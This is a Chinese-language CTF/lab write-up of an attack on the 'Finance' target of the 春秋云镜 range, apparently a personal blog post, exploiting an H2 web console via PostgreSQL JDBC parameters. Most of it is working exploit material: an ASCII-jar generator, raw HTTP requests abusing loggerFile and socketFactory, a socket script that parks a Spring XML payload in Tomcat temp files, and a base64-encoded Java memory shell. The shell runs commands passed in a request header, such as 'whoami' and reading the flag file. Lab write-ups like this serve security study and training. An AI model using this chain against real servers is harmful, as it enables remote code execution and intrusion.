---
title: "春秋云镜 Finance postgresql jdbc attack部分"
onlyTitle: true
date: 2025-11-16 11:54:32
categories:
- 渗透
- 春秋云镜
tags:
- 春秋云镜
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8179.png
---



## 春秋云镜 Finance postgresql jdbc attack部分

大佬叫打的，好像是靶场的一血？

h2 webconsole

报错显示h2版本为2.1.214，如果要直接打h2 webconsole，虽然目标开了自创建test数据库，还是需要出网才能打ClassPathXmlApplicationContext，不出网需要commons-io写文件。

https://godownio.github.io/2025/05/06/jre17-huan-jing-xia-de-h2-jdbc-attack/

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/5880e749f0a91ae488417506cc9b22ff.png)

但是h2 webconsole可以用其他数据库驱动，在tomcat环境下可以利用Tomcat临时文件达到不出网ClassPathXmlApplicationContext的利用（也就是利用AntPathMatcher.isPattern的解析环境变量和通配符的功能），打的postgresql组件

https://godownio.github.io/2025/04/17/tomcat-xia-classpathxmlapplicationcontext-de-bu-chu-wang-li-yong/

先尝试一手最通用的ascii-jar写绕过脏数据的通用手法，用下面的payload产生一个jar包

```python
#!/usr/bin/env python
# autor: c0ny1
# date 2022-02-13
from __future__ import print_function

import time
from compress import *

allow_bytes = []
disallowed_bytes = [38,60,39,62,34,40,41] # &<'>"()
for b in range(0,128): # ASCII
    if b in disallowed_bytes:
        continue
    allow_bytes.append(b)


if __name__ == '__main__':
    padding_char = 'A'
    raw_filename = 'poc.xml'
    zip_entity_filename = 'META-INF/resources/poc.xml'
    jar_filename = 'ascii02.jar'
    num = 1
    while True:
        # step1 动态生成java代码并编译
        javaCode = """<?xml version="1.0" encoding="UTF-8"?>
<!-- {PADDING_DATA} -->
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
                           http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="decoder" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
        <property name="staticMethod" value="javax.xml.bind.DatatypeConverter.parseBase64Binary"/>
        <property name="arguments">
            <list>
                <value>java MemShell</value>

            </list>

        </property>

    </bean>

    <bean id="classLoader" class="javax.management.loading.MLet"/>
    <bean id="clazz" factory-bean="classLoader" factory-method="defineClass">
        <constructor-arg ref="decoder"/>
        <constructor-arg type="int" value="0"/>
        <constructor-arg type="int" value="5128"/>
    </bean>

    <bean factory-bean="clazz" factory-method="newInstance"/>
</beans>
            """
        padding_data = padding_char * num
        javaCode = javaCode.replace("{PADDING_DATA}", padding_data)

        f = open(raw_filename, 'w')
        f.write(javaCode)
        f.close()
        time.sleep(0.1)

        # step02 计算压缩之后的各个部分是否在允许的ASCII范围
        raw_data = bytearray(open(raw_filename, 'rb').read())
        compressor = ASCIICompressor(bytearray(allow_bytes))
        compressed_data = compressor.compress(raw_data)[0]
        crc = zlib.crc32(raw_data) % pow(2, 32)

        st_crc = struct.pack('<L', crc)
        st_raw_data = struct.pack('<L', len(raw_data) % pow(2, 32))
        st_compressed_data = struct.pack('<L', len(compressed_data) % pow(2, 32))
        st_cdzf = struct.pack('<L', len(compressed_data) + len(zip_entity_filename) + 0x1e)


        b_crc = isAllowBytes(st_crc, allow_bytes)
        b_raw_data = isAllowBytes(st_raw_data, allow_bytes)
        b_compressed_data = isAllowBytes(st_compressed_data, allow_bytes)
        b_cdzf = isAllowBytes(st_cdzf, allow_bytes)

        # step03 判断各个部分是否符在允许字节范围
        if b_crc and b_raw_data and b_compressed_data and b_cdzf:
            print('[+] CRC:{0} RDL:{1} CDL:{2} CDAFL:{3} Padding data: {4}*{5}'.format(b_crc, b_raw_data, b_compressed_data, b_cdzf, num, padding_char))
            # step04 保存最终ascii jar
            output = open(jar_filename, 'wb')
            output.write(wrap_jar(raw_data,compressed_data, zip_entity_filename.encode()))
            print('[+] Generate {0} success'.format(jar_filename))
            break
        else:
            print('[-] CRC:{0} RDL:{1} CDL:{2} CDAFL:{3} Padding data: {4}*{5}'.format(b_crc, b_raw_data,
                                                                                       b_compressed_data, b_cdzf, num,
                                                                                       padding_char))
        num = num + 1

```

利用postgresql loggerFile写文件

```http
POST /h2-console/login.do?jsessionid=5c80db64f648e5265fa86c4c8fe6d362 HTTP/1.1
Host: 172.22.10.7:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Referer: http://172.22.10.7:8080/h2-console/login.do?jsessionid=fd406a4fd140c1aae15e2d29715a4291
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Origin: http://172.22.10.7:8080
Content-Length: 141

language=en&name=Generic+PostgreSQL&setting=Generic+PostgreSQL&user=sa&password=sa&url={{urlenc(jdbc:postgresql:///?loggerLevel=DEBUG&loggerFile=C://Windows/Temp/ascii02.jar&)}}(+JAR压缩包URLEncode)
```

用socketFactory去加载

```http
POST /h2-console/login.do?jsessionid=5c80db64f648e5265fa86c4c8fe6d362 HTTP/1.1
Host: 172.22.10.7:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Referer: http://172.22.10.7:8080/h2-console/login.do?jsessionid=fd406a4fd140c1aae15e2d29715a4291
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Origin: http://172.22.10.7:8080
X-Authorization: whoami
Content-Length: 141

language=en&setting=Generic+PostgreSQL&url={{urlenc(jdbc:postgresql:///?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=jar:file:///C:/Windows/Temp/ascii02.jar!/META-INF/resources/poc.xml)}}
```

根据报错信息，jar包是成功写上去了（ascii02显示ZipException，ascii03显示FileNotFoundException），但是这个写文件是通过写日志文件保存，如果日志前半部分有影响zip结构（中央目录项和EOCD块），那就不能解析jar

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/ac0feddaa0abddc938b3956c926479c0.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/36ce339af5a3ef75249df73c3d70df7c.png)

打临时文件加载也不行，我怀疑是用Tomcat结束了文件上传的请求spring再解析的参数？因为code-breaking 205是直接把参数用get接收，而这里很明显可以看到是post接收的参数，我们现在可以合理猜测需要分两个请求传输，也就是先驻留一个文件，下次再用CPX加载

这里有个trick：

file协议直接读不会有file not found的报错信息

根据上面写jar的经验，发现jar可以探测文件是否存在，不过可惜的是，jar并不能与通配符搭配使用（已实践），所以`jar:file://**/*.tmp`的探测手法不能用

先打个驻留（原理搜索m4x 师傅的研究 MySQL JDBC 不出网攻击），这里一开始我是没加结尾的`--xxxxxx`，因为xml加载时`</beans>`结束后必须完全没有脏字符，而不加`--xxxxxx`结尾会导致在`</beans>`后个别脏字节造成乱码，而不是EOF。导致加载失败

后来发现加上结尾的`--xxxxxx`，只要加的不是`--xxxxxx--`，仍然会保持驻留，并且加上了结尾会给文件顺利的写上EOF结束字节。

解法：

```python
import socket
import time

HOST = '172.22.10.7'
PORT = 8080


if __name__ == '__main__':
    payload = '''
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
                           http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="decoder" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
        <property name="staticMethod" value="javax.xml.bind.DatatypeConverter.parseBase64Binary"/>
        <property name="arguments">
            <list>
                <value>yv66vgAAADIBOwEAWW9yZy9hcGFjaGUvY29sbGVjdGlvbnMvY295b3RlL1J1bnRpbWVKc29uTWFwcGluZ0V4Y2VwdGlvbmJkZDg2N2FkM2U2ZDQ3YWI4YjNkMjE3M2U5ZTQ0YWEyBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEABjxpbml0PgEAAygpVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HAAcMAAUABgoABAAJAQADcnVuDAALAAYKAAIADAEAEGdldFJlcUhlYWRlck5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAD1gtQXV0aG9yaXphdGlvbggAEAEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcAEgEAE2phdmEvbGFuZy9UaHJvd2FibGUHABQBABBqYXZhL2xhbmcvVGhyZWFkBwAWAQAKZ2V0VGhyZWFkcwgAGAEAD2phdmEvbGFuZy9DbGFzcwcAGgEAEltMamF2YS9sYW5nL0NsYXNzOwcAHAEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwwAHgAfCgAbACABABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHACIBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAJAAlCgAjACYBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMACgAKQoAIwAqAQATW0xqYXZhL2xhbmcvVGhyZWFkOwcALAEAB2dldE5hbWUMAC4ADwoAFwAvAQAEaHR0cAgAMQEAEGphdmEvbGFuZy9TdHJpbmcHADMBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwANQA2CgA0ADcBAAhBY2NlcHRvcggAOQEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwAOwA8CgAEAD0BAAZ0YXJnZXQIAD8BABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DABBAEIKABsAQwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkBwBFCgBGACYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwASABJCgBGAEoBAAhlbmRwb2ludAgATAEABnRoaXMkMAgATgEAB2hhbmRsZXIIAFABAA1nZXRTdXBlcmNsYXNzDABSADwKABsAUwEABmdsb2JhbAgAVQEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwAVwBYCgAbAFkBACJvcmcuYXBhY2hlLmNveW90ZS5SZXF1ZXN0R3JvdXBJbmZvCABbAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyBwBdAQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwAXwBgCgBeAGEKABsALwEACnByb2Nlc3NvcnMIAGQBABNqYXZhL3V0aWwvQXJyYXlMaXN0BwBmAQAEc2l6ZQEAAygpSQwAaABpCgBnAGoBABUoSSlMamF2YS9sYW5nL09iamVjdDsMAEgAbAoAZwBtAQADcmVxCABvAQAHZ2V0Tm90ZQgAcQEAEWphdmEvbGFuZy9JbnRlZ2VyBwBzAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7DAB1AHYJAHQAdwEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7DAB5AHoKAHQAewEACWdldEhlYWRlcggAfQEACWdldE1ldGhvZAwAfwAfCgAbAIAMAA4ADwoAAgCCAQALZ2V0UmVzcG9uc2UIAIQBAAlnZXRXcml0ZXIIAIYBAA5qYXZhL2lvL1dyaXRlcgcAiAEABmhhbmRsZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7DACKAIsKAAIAjAEABXdyaXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDACOAI8KAIkAkAEABWZsdXNoDACSAAYKAIkAkwEABWNsb3NlDACVAAYKAIkAlgEABGV4ZWMBAAdvcy5uYW1lCACZAQAQamF2YS9sYW5nL1N5c3RlbQcAmwEAC2dldFByb3BlcnR5DACdAIsKAJwAngEAC3RvTG93ZXJDYXNlDACgAA8KADQAoQEAA3dpbggAowEABy9iaW4vc2gIAKUBAAItYwgApwEAB2NtZC5leGUIAKkBAAIvYwgAqwEAEWphdmEvbGFuZy9SdW50aW1lBwCtAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwArwCwCgCuALEBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DACYALMKAK4AtAEAEWphdmEvbGFuZy9Qcm9jZXNzBwC2AQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwwAuAC5CgC3ALoBABFqYXZhL3V0aWwvU2Nhbm5lcgcAvAEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgwABQC+CgC9AL8BAAJcYQgAwQEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwwAwwDECgC9AMUBAAAIAMcBAAdoYXNOZXh0AQADKClaDADJAMoKAL0AywEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyBwDNCgDOAAkBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsMANAA0QoAzgDSAQAEbmV4dAwA1AAPCgC9ANUBAAh0b1N0cmluZwwA1wAPCgDOANgBAApnZXRNZXNzYWdlDADaAA8KAAgA2wEAE1tMamF2YS9sYW5nL1N0cmluZzsHAN0BABNqYXZhL2lvL0lucHV0U3RyZWFtBwDfAQAGZXlKZVhBCADhAQAKc3RhcnRzV2l0aAEAFShMamF2YS9sYW5nL1N0cmluZzspWgwA4wDkCgA0AOUBAAZsZW5ndGgMAOcAaQoANADoAQAGY2hhckF0AQAEKEkpQwwA6gDrCgA0AOwBABUoQylMamF2YS9sYW5nL1N0cmluZzsMAHkA7goANADvAQAIcGFyc2VJbnQBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkMAPEA8goAdADzAQABLggA9QEAB2luZGV4T2YMAPcA8goANAD4AQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwwA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</value>

            </list>

        </property>

    </bean>

    <bean id="classLoader" class="javax.management.loading.MLet"/>
    <bean id="clazz" factory-bean="classLoader" factory-method="defineClass">
        <constructor-arg ref="decoder"/>
        <constructor-arg type="int" value="0"/>
        <constructor-arg type="int" value="5128"/>
    </bean>
    <bean factory-bean="clazz" factory-method="newInstance"/>
    </beans>'''

    a = b'''POST / HTTP/1.1
Host: 172.22.10.7:8080
Accept-Encoding: gzip, deflate
Accept: */*
Content-Type: multipart/form-data; boundary=xxxxxx
User-Agent: python-requests/2.32.3
Content-Length: 1296800

--xxxxxx
Content-Disposition: form-data; name="file"; filename="a.txt"

{{payload}}
--xxxxxx
'''.replace(b"\n", b"\r\n").replace(b"{{payload}}", payload.encode())

    s = socket.socket()
    s.connect((HOST, PORT))
    s.sendall(a)
    time.sleep(1111111)
```

写的spring的通用回显（非持久化内存马），没有spring的环境下需要重新打

```http
POST /h2-console/login.do?jsessionid=c6642992d40cdda702b841ff6ab98bb0 HTTP/1.1
Host: 172.22.10.7:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Referer: http://172.22.10.7:8080/h2-console/login.do?jsessionid=fd406a4fd140c1aae15e2d29715a4291
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Origin: http://172.22.10.7:8080
X-Authorization: type f1111laag.txt
Content-Length: 141

language=en&setting=Generic+PostgreSQL&url={{urlenc(jdbc:postgresql:///?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=file://${catalina.home}/work/Tomcat/localhost/ROOT/*.tmp)}}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/2252e07bb81d2da2171e6a60383985af.png)

flag{9b639ea2-d4bc-4403-ac58-8ab8d50f743b}